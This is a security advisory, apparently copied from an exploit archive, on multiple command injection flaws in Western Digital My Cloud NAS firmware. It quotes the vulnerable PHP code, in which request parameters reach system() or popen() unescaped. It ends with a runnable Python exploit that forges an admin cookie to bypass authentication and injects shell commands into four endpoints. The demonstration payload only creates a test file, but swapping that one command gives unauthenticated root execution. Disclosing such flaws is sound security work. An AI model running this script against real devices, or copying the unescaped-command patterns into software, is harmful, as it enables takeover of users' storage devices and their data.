@@ -1,0 +1,333 @@
+id: 27247
+date: 03/08/2017
+title: Western Digital My Cloud Command Injection Vulnerability
+author: Remco Vermeulen
+cves: 
+
+------------------------------------------------------------------------
+Western Digital My Cloud vulnerable to multiple command injection
+vulnerabilities
+------------------------------------------------------------------------
+Remco Vermeulen, January 2017
+
+------------------------------------------------------------------------
+Abstract
+------------------------------------------------------------------------
+It was discovered that the Western Digital My Cloud is affected by
+multiple command injection vulnerabilities. Some of these issues don't
+require authentication and allow an attacker to gain complete control
+(root access) of the affected device. Some do require authentication, in
+this case an attacker can use Cross-Site Request Forgery (CSRF, see
+advisory SFY20170104) or authentication bypass (see advisory
+SFY20170102) and still gain complete control of the vulnerable Western
+Digital device.
+
+------------------------------------------------------------------------
+See also
+------------------------------------------------------------------------
+- 
+https://security.szurek.pl/wd-my-cloud-mirror-211153-rce-and-authentication-bypass.html
+- https://blog.exploitee.rs/2017/hacking_wd_mycloud/
+- https://www.exploitee.rs/index.php/Western_Digital_MyCloud
+- 
+https://securify.nl/advisory/SFY20170102/authentication_bypass_vulnerability_in_western_digital_my_cloud.html
+- 
+https://securify.nl/advisory/SFY20170104/western_digital_my_cloud_vulnerable_to_cross_site_request_forgery_vulnerability.html
+
+------------------------------------------------------------------------
+Tested versions
+------------------------------------------------------------------------
+These vulnerabilities were successfully verified on a Western Digital My
+Cloud model WDBCTL0020HWT running firmware versions 2.21.119 and
+2.21.126. These issues aren't limited to the model that was used to find
+these vulnerabilities since most of the products in the My Cloud series
+share the same (vulnerable) code.
+
+------------------------------------------------------------------------
+Fix
+------------------------------------------------------------------------
+There is currently no fix available.
+
+------------------------------------------------------------------------
+Details
+------------------------------------------------------------------------
+https://www.securify.nl/advisory/SFY20170103/western_digital_my_cloud_vulnerable_to_multiple_command_injection_vulnerabilities.html
+
+Multiple endpoints on the My Cloud device are susceptible to command injection. Most of these issues are only exploitable by an authenticated user. Some of them can be exploited unauthenticated as there is no login check implemented in the affected endpoints. The following endpoints were found to be vulnerable.
+Vulnerable endpoints not requiring authentication
+
+- web/addons/jqueryFileTree.php:
+Multiple parameters in this endpoint are susceptible to command injection. The following code snippet shows how POST parameters are used to construct a command which is subsequently executed by the popen() function without any escaping.
+
+$host = ($_POST['host'] == "")? $_GET['host']:$_POST['host'];
+$pwd = ($_POST['pwd'] == "")? $_GET['pwd']:$_POST['pwd'];
+$user = ($_POST['user'] == "")? $_GET['user']:$_POST['user'];
+$dir = ($_POST['dir'] == "")? $_GET['dir']:$_POST['dir'];
+$lang = ($_POST['lang'] == "")? $_GET['lang']:$_POST['lang'];
+//echo $dir."dir1=".dir1;
+error_reporting(0);
+   
+      @unlink("/tmp/ftp-folder.txt");
+      @unlink("/tmp/ftp-file.txt");
+   
+      $cmd = sprintf("ftp_download -c gettree -i \"%s\" -u \"%s\" -p \"%s\" -t \"%s\" -l \"%s\"", $host, $user, $pwd ,$dir ,$lang);
+   
+      $handle = popen($cmd, 'r');      
+      $read = fread($handle, 2096);
+
+- web/addons/ftp_download.php:
+Multiple parameters in this endpoint are susceptible to command injection. The following code snippet shows an instance of how POST parameters are used to construct a command which is subsequently executed by the system() function without any escaping.
+
+switch ($action)
+{
+   case "create":
+   {
+      $taskname = $_POST['taskname'];      
+      $source_dir = $_POST['source_dir'];
+      $dest_dir = $_POST['dest_dir'];      
+      $schedule = $_POST['schedule'];
+      $schedule_type = $_POST['backup_sch_type'];
+      $hour = $_POST['hour'];
+      $week = $_POST['week'];
+      $day = $_POST['day'];
+      
+      $host = $_POST['host'];
+      $user = $_POST['user'];
+      $pwd = $_POST['pwd'];
+      $lang = $_POST['lang'];
+   
+      $sch_command = "";
+      if ($schedule == "0")$sch_command = "0,1,1";
+      else if ($schedule_type == "3")$sch_command = "3,1,".$hour; //daily
+      else if ($schedule_type == "2")$sch_command = "2,".$week.",".$hour; //weekly
+      else if ($schedule_type == "1")$sch_command = "1,".$day.",".$hour; //monthly
+   
+   
+      $cmd = sprintf("ftp_download -a \"%s\" -i \"%s\" -u \"%s\" -p \"%s\" -l \"%s\" -d \"%s\" -r %s -c jobadd",
+               $taskname, $host, $user, $pwd, $lang, $dest_dir, $sch_command);
+   
+      foreach ($source_dir as $val)
+         $cmd .= sprintf(" -s \"%s\"", $val);
+   
+         $cmd .= " >/dev/null 2>&1";
+      system($cmd);
+
+- web/storage/raid_cgi.php:
+The run_cmd parameter is susceptible to command injection. The following code snippet shows how the run_cmd parameter is used to construct a command which is subsequently executed by the system() function without any escaping.
+
+...
+switch ($action)
+{
+   case "cgi_Run_Smart_Test":
+   {
+      $run_cmd = $_POST['run_cmd'];
+      system("smart_test -X > /dev/null");
+
+      $run_cmd .= " > /dev/null &";
+      system($run_cmd);
+      ...
+
+Vulnerable endpoints requiring authentication
+
+- web/php/noHDD.php:
+The enable parameter of this endpoint is susceptible to command injection. This endpoint requires authentication by at least a non-admin user. The following snippet shows how the enable parameter is used to construct a command passed to the exec() function without escaping.
+
+[...]
+$enable = $_REQUEST['enable'];   //enable or disable
+   
+switch ($cmd) {
+   case "getDiskStatus":
+      getDiskStatus();
+      break;
+   case "setSataPower":
+      setSataPower($enable);
+      break;
+}
+function setSataPower($enable)
+{
+   $state = "ok";
+   if(file_exists("/tmp/system_ready"))
+   {
+      $setCmd = "sata_power.sh \"$enable\"";
+      exec($setCmd,$retval);
+   }
+[...]
+
+- web/php/remoteBackups.php:
+The jobName parameter of this endpoint is susceptible to command injection. This endpoint requires authentication by an admin user. The following snippet shows how the jobName parameter is used to construct a command passed to the system() function without escaping.
+
+...
+$cmd = $_REQUEST['cmd'];
+$RemoteBackupsAPI = new RemoteBackupsAPI;
+
+switch ($cmd) {
+   case "getRecoverItems":
+      $RemoteBackupsAPI->getRecoverItems();
+      break;
+}
+
+
+class RemoteBackupsAPI{
+   public function getRecoverItems()
+   {
+      $xmlPath = "/var/www/xml/rsync_recover_items.xml";
+      $jobName = $_REQUEST['jobName'];
+      
+      @unlink($xmlPath);
+      
+      $cmd = "rsyncmd -l \"$xmlPath\" -r \"$jobName\" >/dev/null";
+      system($cmd);
+      
+      if (file_exists($xmlPath))
+      {
+         print file_get_contents($xmlPath);
+      }
+      else
+      {
+         print "<config></config>";
+      }
+   }
+}
+...
+
+- web/google_analytics.php:
+The arg parameter of this endpoint is susceptible to command injection. This endpoint requires authentication by at least a non-admin user. The following snippet shows how the arg parameter is used to construct a command passed to the system() function without escaping.
+
+...
+switch ($action)
+{
+   case "set":
+   {
+      $opt = $_POST['opt'];
+      $arg = $_POST['arg'];
+      $run_cmd = sprintf("ganalytics --%s %s > /dev/null &", $opt, ($arg != "") ? $arg : "");
+      
+      system($run_cmd);
+
+      $r->run_cmd = $run_cmd;
+      $r->success = true;
+      echo json_encode($r);
+   }
+   break;   
+}
+...
+
+- web/php/chk_vv_sharename.php:
+The vv_sharename parameter of this endpoint is susceptible to command injection. This endpoint requires authentication by an admin user. The following snippet shows how the vv_sharename parameter is used to construct a command passed to the system() function without escaping.
+
+...
+{
+   $vv_sharename = $_GET['vv_sharename'];
+   
+   if(empty($_GET["vv_sharename"]))
+   {
+      echo 'Parameter vv_sharename is missing.';
+      return;
+   }
+   
+   $cmd = "vvctl --check_share_name -s \"$vv_sharename\" >/dev/null";
+   system($cmd);
+   ...
+
+Proof of Concept
+
+The following Python script exploits can be used to exploit the command injections in the following endpoints:
+- web/php/remoteBackups.php
+- web/storage/raid_cgi.php
+- web/google_analytics.php
+- web/php/chk_vv_sharename.php
+
+Note that this script also uses the authentication bypass vulnerability to run arbitrary code as an unauthenticated user.
+
+import requests
+import time
+import inspect
+import sys
+   
+mycloud_addr="127.0.0.1"
+headers = {"Cookie": "username=admin; isAdmin=1"}
+dryrun = False
+   
+def dump_request(req):
+   print "{}\n{}\n{}\n\n{}".format(
+      '-----------START-----------',
+      req.method + ' ' + req.url,
+      '\n'.join('{}: {}'.format(k, v) for k, v in req.headers.items()),
+      req.body)
+   
+def gen_rce_test_file():
+   return "/var/www/fsociety_%s.dat" % int(time.time())
+   
+def verify_test_file(test_file):
+   test_endpoint = "http://%s/%s" % (mycloud_addr, test_file[len('/var/www/'):])
+   print "[+] Verify test file on %s" % test_endpoint
+   if requests.get(test_endpoint).status_code == requests.codes.ok:
+      print "[+] Successfully exploited RCE"
+   else:
+      print "[-] Failed to validate RCE"
+   
+def do_post(endpoint, payload, test_file):
+   req = requests.Request("POST", "http://%s/%s" % (mycloud_addr, endpoint), headers=headers, data=payload)
+   prepared = req.prepare()
+   if dryrun:
+      dump_request(prepared)
+   else:
+      s = requests.Session()
+      resp = s.send(prepared)
+      if resp.status_code == requests.codes.ok:
+         verify_test_file(test_file)
+      else:
+         print "[-] Failed to exploit RCE"
+   
+def do_get(endpoint, payload, test_file):
+   req = requests.Request("GET", "http://%s/%s" % (mycloud_addr, endpoint), headers=headers, params=payload)
+   prepared = req.prepare()
+   if dryrun:
+      dump_request(prepared)
+   else:
+      s = requests.Session()
+      resp = s.send(prepared)
+      if resp.status_code == requests.codes.ok:
+         verify_test_file(test_file)
+      else:
+         print "[-] Failed to exploit RCE"
+   
+def exploit_remote_backups():
+   print "[+] Exploiting remote backups"
+   endpoint = "web/php/remoteBackups.php"
+   test_file = gen_rce_test_file()
+   payload = {
+      "cmd": "getRecoverItems",
+      "jobName": "`touch %s; echo foo`" % test_file
+   }
+   do_post(endpoint, payload, test_file)
+   
+def exploit_chk_vv_sharename():
+   print "[+] Exploiting chk_vv_sharename"
+   endpoint = "web/php/chk_vv_sharename.php"
+   test_file = gen_rce_test_file()
+   payload = {"vv_sharename": "`touch %s; echo foo`" % test_file}
+   do_get(endpoint, payload, test_file)
+   
+def exploit_raid_cgi():
+   print "[+] Exploiting raid cgi"
+   endpoint = "web/storage/raid_cgi.php"
+   test_file = gen_rce_test_file()
+   payload={"cmd": "cgi_Run_Smart_Test", "run_cmd": "touch %s" % test_file}
+   do_post(endpoint, payload, test_file)
+   
+def exploit_ganalytics():
+   print "[+] Exploiting ganalytics"
+   endpoint = "web/google_analytics.php"
+   test_file = gen_rce_test_file()
+   payload={"cmd": "set", "opt": "pv-backups", "arg": "; touch %s" % test_file}
+   do_post(endpoint, payload, test_file)
+   
+def all_exploits():
+   return [obj for name,obj in inspect.getmembers(sys.modules[__name__]) if (inspect.isfunction(obj) and name.startswith('exploit'))]
+   
+for f in all_exploits():
+   f()
+   time.sleep(1)
+
+#  0day.today [2023-03-25]  #
